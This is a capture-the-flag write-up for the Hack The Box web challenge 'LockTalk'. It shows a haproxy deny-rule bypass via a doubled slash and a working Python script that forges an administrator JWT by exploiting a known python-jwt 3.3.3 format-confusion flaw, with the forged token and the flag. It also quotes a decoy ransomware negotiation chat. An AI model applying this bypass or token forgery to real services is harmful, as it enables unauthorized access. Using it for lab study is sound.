# LockTalk

> In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization's mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.
>
> Web Site:
> - `http://94.237.58.155:57483/`
> 
> Files:
> - [web_locktalk.zip](web_locktalk.zip)


**Writeup by:** Hein Andre Grønnestad


- [LockTalk](#locktalk)
  - [Checking Provided Files](#checking-provided-files)
  - [Web Site](#web-site)
  - [`haproxy`](#haproxy)
    - [Bypassing `haproxy`](#bypassing-haproxy)
  - [Testing The API](#testing-the-api)
    - [`/api/v1/flag`](#apiv1flag)
    - [`/api/v1/chat/{chatId}`](#apiv1chatchatid)
  - [Chat](#chat)
  - [LFI?](#lfi)
  - [JWT Token Vulnerability](#jwt-token-vulnerability)
    - [`python-jwt`](#python-jwt)
  - [Flag](#flag)


## Checking Provided Files

```bash
$ unzip web_locktalk.zip
Archive:  web_locktalk.zip
  inflating: build_docker.sh
   creating: challenge/
  inflating: challenge/config.py
   creating: challenge/app/
   creating: challenge/app/api/
   creating: challenge/app/api/json/
  inflating: challenge/app/api/json/9.json
  inflating: challenge/app/api/json/5.json
  inflating: challenge/app/api/json/8.json
  inflating: challenge/app/api/json/4.json
  inflating: challenge/app/api/json/7.json
  inflating: challenge/app/api/json/10.json
  inflating: challenge/app/api/json/1.json
  inflating: challenge/app/api/json/6.json
  inflating: challenge/app/api/json/3.json
  inflating: challenge/app/api/json/2.json
  inflating: challenge/app/api/routes.py
  inflating: challenge/app/api/__init__.py
  inflating: challenge/app/__init__.py
   creating: challenge/app/main/
  inflating: challenge/app/main/routes.py
   creating: challenge/app/main/templates/
  inflating: challenge/app/main/templates/index.html
   creating: challenge/app/main/static/
   creating: challenge/app/main/static/js/
  inflating: challenge/app/main/static/js/main.js
 extracting: challenge/app/main/static/js/.gitkeep
   creating: challenge/app/main/static/css/
  inflating: challenge/app/main/static/css/style.css
 extracting: challenge/app/main/static/css/.gitkeep
   creating: challenge/app/main/static/images/
 extracting: challenge/app/main/static/images/.gitkeep
   creating: challenge/app/main/static/fonts/
 extracting: challenge/app/main/static/fonts/.gitkeep
  inflating: challenge/app/main/__init__.py
   creating: challenge/app/middleware/
  inflating: challenge/app/middleware/middleware.py
 extracting: challenge/app/middleware/__init__.py
  inflating: challenge/run.py
   creating: conf/
 extracting: conf/requirements.txt
  inflating: conf/haproxy.cfg
  inflating: conf/uwsgi.ini
  inflating: conf/supervisord.conf
  inflating: Dockerfile
```

## Web Site

![Alt text](images/image.png)

The web site is a documentation page for an API.


## `haproxy`

[`conf/haproxy.cfg`](conf/haproxy.cfg)

haproxy is used as a reverse proxy and there is a `http-request deny` rule for `/api/v1/get_ticket`:

```
http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```

When we try to execute the `GET /api/v1/get_ticket` request we get:

![Alt text](images/image-2.png)


### Bypassing `haproxy`

![Alt text](images/image-1.png)

If we try to access the API endpoint directly and manipulate the URL with a extra `/` we can bypass the `haproxy` rule:

```
http://94.237.58.155:57483//api/v1/get_ticket
```

```json
{
    "ticket: ": "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA0MTA3OTksImlhdCI6MTcxMDQwNzE5OSwianRpIjoidWltSkd6Z3VmeXpqMnczT1l3UTVSUSIsIm5iZiI6MTcxMDQwNzE5OSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.Somq4HqjlowSFEGbTWlL0Pds7wx8aiwwA3IYDXoB0unKY0ik7nCPjMKOqNc4PUjYC1uYY4l-DUOtmEwcFvEuRa52Ksbr2kd2e4DR3Sz0_UVetTIGHv9Qwx95jeR7gvWb7yWNqyCrgyXWbo-GiYsFpAxIyyWmt4vW22tow9B_WO4Z1SiD0jln-dOtimcEOiF954YpbZGHNHBu5j2ZvVG1ei9rQFVeGJKRDw-ppbQTWRGF1Y3v794k4PAfKjXVQ0c4c2a8KE8FtevJPeGXPBZs0RqpU7m5yDqlBx59OzZRnq01zlXNZYEiaURymBaBSFP3o4LNj2QUSYq7sUgnpK3G_Q"
}
```

Nice! Now we have a JWT token!


## Testing The API

### `/api/v1/flag`

![Alt text](images/image-3.png)

Seems like we are identified as a guest user and we don't have access to the flag.

### `/api/v1/chat/{chatId}`

![Alt text](images/image-4.png)

We have access to the chat API! Let's have a look.


## Chat

```json
{
  "chat_id": "1",
  "messages": [
    {
      "content": "[Chat started]",
      "party": "Victim",
      "timestamp": "26.07.2022 16:05:41 UTC"
    },
    {
      "content": "hello",
      "party": "OpenBit 3.0",
      "timestamp": "26.07.2022 16:27:56 UTC"
    },
    {
      "content": "Are you ready to negotiate?",
      "party": "OpenBit 3.0",
      "timestamp": "26.07.2022 16:28:28 UTC"
    },
    {
      "content": "Price decrypt 3 000 000$",
      "party": "OpenBit 3.0",
      "timestamp": "26.07.2022 16:42:56 UTC"
    },
    {
      "content": "Hello",
      "party": "Victim",
      "timestamp": "27.07.2022 15:19:16 UTC"
    },
    {
      "content": "are you here ?",
      "party": "Victim",
      "timestamp": "27.07.2022 15:23:55 UTC"
    },
    {
      "content": "yes",
      "party": "OpenBit 3.0",
      "timestamp": "27.07.2022 15:24:14 UTC"
    },
    {
      "content": "we wait your answer and your offers",
      "party": "OpenBit 3.0",
      "timestamp": "27.07.2022 15:24:38 UTC"
    },
    {
      "content": "3 000 000$ is too much whats your best offer ?",
      "party": "Victim",
      "timestamp": "27.07.2022 15:25:50 UTC"
    },
    {
      "content": "well, given that your network was not completely infected, we can drop the price to 1,000,000",
      "party": "OpenBit 3.0",
      "timestamp": "27.07.2022 15:26:49 UTC"
    },
    {
      "content": "Also keep in mind that we have stolen your data and can publish it at any time",
      "party": "OpenBit 3.0",
      "timestamp": "27.07.2022 15:27:34 UTC"
    },
    {
      "content": "http://OpenBitapt2d73krlbewgv27tquljgxr33xbwwsp6rkyieto7u4ncead.onion/post/[redacted]",
      "party": "OpenBit 3.0",
      "timestamp": "27.07.2022 15:27:49 UTC"
    },
    {
      "content": "We offer you to decrypt all your files as well as files of your hypervisors for 1 million",
      "party": "OpenBit 3.0",
      "timestamp": "27.07.2022 15:28:37 UTC"
    },
    {
      "content": "You are a fairly large company and it will not be a problem for you to collect such an amount",
      "party": "OpenBit 3.0",
      "timestamp": "27.07.2022 15:29:12 UTC"
    },
    {
      "content": "[redacted] - BTC Wallet",
      "party": "OpenBit 3.0",
      "timestamp": "27.07.2022 15:33:02 UTC"
    },
    {
      "content": "It's up to you to pay or not, we also backed up your SQL databases before overwriting and encrypting them so they're safe",
      "party": "OpenBit 3.0",
      "timestamp": "27.07.2022 15:34:38 UTC"
    },
    {
      "content": "ur offer is that you make a payment of exactly $ 1,000,000 and we give you a full set of decoders for both ESXi and the Windows family",
      "party": "OpenBit 3.0",
      "timestamp": "27.07.2022 15:37:59 UTC"
    }
  ]
}
```

These chats are basically decoys and doesn't contain any useful information.


## LFI?

I got side-tracked and started looking for a LFI vulnerabilities in the API based on the following code:

```python
@api_blueprint.route('/chat/<int:chat_id>', methods=['GET'])
@authorize_roles(['guest', 'administrator'])
def chat(chat_id):

    json_file_path = os.path.join(JSON_DIR, f"{chat_id}.json")

    if os.path.exists(json_file_path):
        with open(json_file_path, 'r') as f:
            chat_data = json.load(f)
        
        chat_id = chat_data.get('chat_id', None)
        
        return jsonify({'chat_id': chat_id, 'messages': chat_data['messages']})
    else:
        return jsonify({'error': 'Chat not found'}), 404
```

I was trying to figure out if there was a way to bypass the `<int:chat_id>` rule in `@api_blueprint.route('/chat/<int:chat_id>', methods=['GET'])` and then manipulate the `f"{chat_id}.json"` to read other files on the server.

I could not find a way to bypass the `<int:chat_id>` rule and I did not find any LFI vulnerabilities.


## JWT Token Vulnerability

When I saw the API documentation website my instant thought was that this was going to be a JWT token vulnerability challenge.

I tried a lot of manipulation with the JWT token but I could not get the API to accept it.

I spent a lot of time doing research and trying tools like: `jwt_tool` as well as more manual methods.


### `python-jwt`

Then I started looking closer into the `python-jwt` library.

https://pypi.org/project/python-jwt/

![Alt text](images/image-6.png)

I noticed that the version used in the challenge is `3.3.3` and the latest version is `3.3.4`.

From `requirements.txt`:

```
uwsgi
Flask
requests
python_jwt==3.3.3
```

Version `3.3.3` has a vulnerability which let's us generate a token with arbitrary claims and a signature from another valid token.

The fix for this vulnerability can be found here: https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9

> ```
> FIX VULNERABILITY
> jwcrypto accepts both compact and JSON formats.
> It was possible to use this to present a token with arbitrary
> claims with a signature from another valid token.
> 
> See test/vulnerability_vows.py for an example.
> ```

And here is a test case for the vulnerability:
https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9#diff-f3fb6499354e6fd16cb955d1f54138fa3481148f3f095467958b60b3835f3a50

Based on the test case, we can make a script to generate a token with arbitrary claims and a signature from another valid token.

Script here: [`faketoken.py`](faketoken.py)

```python
from json import dumps, loads
from jwcrypto.common import base64url_decode, base64url_encode

""" Make a forged token """
""" Use mix of JSON and compact format to insert forged claims including long expiration """

# The valid token for the guest user
[header, payload, signature] = 'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA0MTQ1NDEsImlhdCI6MTcxMDQxMDk0MSwianRpIjoiRXFYa1JlM0taVm5MY2tmUG13VVpJUSIsIm5iZiI6MTcxMDQxMDk0MSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.dindR6sdLUdJD7Q6y-Ut8XDx0-XTVKGDzI1YVd-7fMkFydE4M-8O4cltoh6KjmiArJNQrkf1cTzFgT0I6hNC0apMMz7f350e7ph5_0DWONnkuFvSuUxkVvsYwm-OuKIIW3NA2U0pGR7xJphGedcwLKel1IaR-XA9bLox4Xo96Nf_XeGn_NuOfKsKhtha5jjPYfcsxoPjpFiQvnWyupM5Tpg7ySUY3lM4c2fuRImdpejzpVqJfD9B0NAfOAw6dUalvoU_LCZYkzluOIncszohluDAGXOIwvK_2c4B0zTUanDcMYxmHIUGfXGQ07-7DGXoC5bnubVQYkr3x_QcNfUdug'.split('.')

parsed_payload = loads(base64url_decode(payload))

# Set the role to administrator
parsed_payload['role'] = 'administrator'

# Create the token
fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))

print('{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}')
```

```bash
$ python3 faketoken.py
{"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA0MTQ1NDEsImlhdCI6MTcxMDQxMDk0MSwianRpIjoiRXFYa1JlM0taVm5MY2tmUG13VVpJUSIsIm5iZiI6MTcxMDQxMDk0MSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTA0MTQ1NDEsImlhdCI6MTcxMDQxMDk0MSwianRpIjoiRXFYa1JlM0taVm5MY2tmUG13VVpJUSIsIm5iZiI6MTcxMDQxMDk0MSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"dindR6sdLUdJD7Q6y-Ut8XDx0-XTVKGDzI1YVd-7fMkFydE4M-8O4cltoh6KjmiArJNQrkf1cTzFgT0I6hNC0apMMz7f350e7ph5_0DWONnkuFvSuUxkVvsYwm-OuKIIW3NA2U0pGR7xJphGedcwLKel1IaR-XA9bLox4Xo96Nf_XeGn_NuOfKsKhtha5jjPYfcsxoPjpFiQvnWyupM5Tpg7ySUY3lM4c2fuRImdpejzpVqJfD9B0NAfOAw6dUalvoU_LCZYkzluOIncszohluDAGXOIwvK_2c4B0zTUanDcMYxmHIUGfXGQ07-7DGXoC5bnubVQYkr3x_QcNfUdug"}
```


## Flag

Now let's use this forged token on the `/api/v1/flag` endpoint:

![Alt text](images/image-5.png)

```
HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}
```
